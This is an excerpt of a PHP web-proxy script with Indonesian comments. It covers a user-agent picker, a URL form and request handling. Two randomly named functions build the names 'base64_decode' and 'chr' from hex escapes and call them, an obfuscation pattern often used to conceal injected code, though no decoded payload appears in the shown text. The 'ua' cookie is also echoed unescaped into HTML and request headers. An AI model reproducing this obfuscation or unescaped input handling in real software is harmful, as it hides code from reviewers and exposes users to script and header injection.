...
function function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini($data){?>
 
<!-- Mulai mengedit dari sini ( header ) -->
<head>
...
?>
  ...
  <form method="post" action="<?php echo $_SERVER['PHP_SELF'] ?>">
    <ul id="form">
      <li id="address_bar"><label>Web Address <input id="address_box" type="text" name="<?php echo $GLOBALS['_config']['url_var_name'] ?>" value="<?php echo isset($GLOBALS['_url']) ? htmlspecialchars($GLOBALS['_url']) : '' ?>" onfocus="this.select()" /></label>
<lable>

<!-- Untuk user agent lainnya silahkan tambah dewek :D :v :v -->
    <select name="user_agent">
     <option value="<? echo $_SERVER["HTTP_USER_AGENT"];?>">Pilih user agent</option>
     <option value="<? echo $_SERVER["HTTP_USER_AGENT"];?>">Default</option>
     <option value="Eddie Kidiw">Tanpa user agent</option>
     <option value="Mozilla/5.0 (Linux; U; Android 4.4.2; id-id; SM-G313HZ Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30">Android 4.4.2 (Kitkat)</option>
      <option value="Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1">Android 2.3.5 (GInger Bread)</option>
     <option value="Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0">Mozilla Firefox</option>
     <option value="Opera/9.80 (X11; Linux zbov; U; en) Presto/2.10.254 Version/12.00">Opera Mobile</option>
     <option value="Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE6-00/111.140.0058; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba">NokiaE6-00</option>
     ...
     <option value="Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17">Android</option>
     <option value="Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1">EudoraWeb</option>
     <option value="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.19)">Windows</option>
     ...
     <option value="BlackBerry9700/5.0.0.351Profile/MIDP-2.1Configuration/CLDC-1.1VendorID/123">BlackBerry (9700)</option>
     <option value="Mozilla/4.0 (PSP (PlayStation Portable); 2.00)">PlayStation Portable</option>
<option value="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)">XP with IE 8</option>
      ...
      <option value="Wget/1.12 (linux-gnu)">Current/Real</option>
    </select>

<!-- Opsi user agent selesai -->

</lable><br />
<input id="go" type="submit" value="Go" /></li>
      <?php
...
<!-- Edit sampai di sini ( footer ) -->

<?php    exit(0);
}

/* function halaman awal berakhir di sini */
...
function bRqj_G_LDGROC($tuZGvcHZBFy)
    {
        $QSCpfke="\x62";
        $QSCpfke.="\x61";
        $QSCpfke.="\x73";
        ...
        $QSCpfke.="\x64";
        $QSCpfke.="\x65";
        return $QSCpfke($tuZGvcHZBFy);
    }
function DwHWzpM($MoQTi_ULDMh)
    {
        $ANZVMuEty="\x63";
        $ANZVMuEty.="\x68";
        $ANZVMuEty.="\x72";
        return $ANZVMuEty($MoQTi_ULDMh);
    }
...
{
    function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'cookies'));
}
else
{
    function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'entry_form'));
}
...
if (url_parse($_url, $_url_parts))
{
    ...
    if (!empty($_hosts))
    {
        foreach ($_hosts as $host)
        {
            ...
            {
                function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'error', 'group' => 'url', 'type' => 'external', 'error' => 1));
            }
        }
    }
}
...
{
    function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'error', 'group' => 'url', 'type' => 'external', 'error' => 2));
}
...
if (!$_config['allow_hotlinking'] && isset($_SERVER['HTTP_REFERER']))
{
    ...
    if ($is_hotlinking)
    {
        ...
        {
            case 1:
                function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'error', 'group' => 'resource', 'type' => 'hotlinking'));
                break;
            case 2:
...
do
{
    ...
    if ($_socket === false)
    {
        function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'error', 'group' => 'url', 'type' => 'internal', 'error' => $err_no));
    }
    ...
    if (isset($_COOKIE['ua']))
    {
        $_request_headers .= 'User-Agent: ' . $_COOKIE['ua'] . "\r\n";
    }
    ...
    if ($_response_code == 401 && isset($_response_headers['www-authenticate']) && preg_match('#basic\s+(?:realm="(.*?)")?#i', $_response_headers['www-authenticate'][0], $matches))
    {
        ...
        {
            function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'auth', 'realm' => $matches[1]));
        }
    }
}
while ($_retry);
...
if (!isset($_proxify[$_content_type]))
{
    ...
    if ($_content_length !== false)
    {
        ...
        {
            function_untuk_halaman_awal_kalo_mau_edit_tampilannya_silahkan_edit_dalam_function_ini(array('which' => 'index', 'category' => 'error', 'group' => 'resource', 'type' => 'file_size'));
        }
...
else
{
    ...
    if ($_flags['include_form'] && !isset($_GET['nf']))
    {
        $_url_form      = '<div style="width:100%;margin:0;text-align:center;border-bottom:1px solid #725554;color:#000000;background-color:#F2FDF3;font-size:12px;font-weight:bold;font-family:Bitstream Vera Sans,arial,sans-serif;padding:4px;">'
                        ...
                        . ' <label for="____' . $_config['url_var_name'] . '"><a href="' . $_url . '">Address</a>:</label> <input id="____' . $_config['url_var_name'] . '" type="text" size="80" name="' . $_config['url_var_name'] . '" value="' . $_url . '" /><input type="hidden" name="user_agent" value="'.$_COOKIE['ua'].'">'
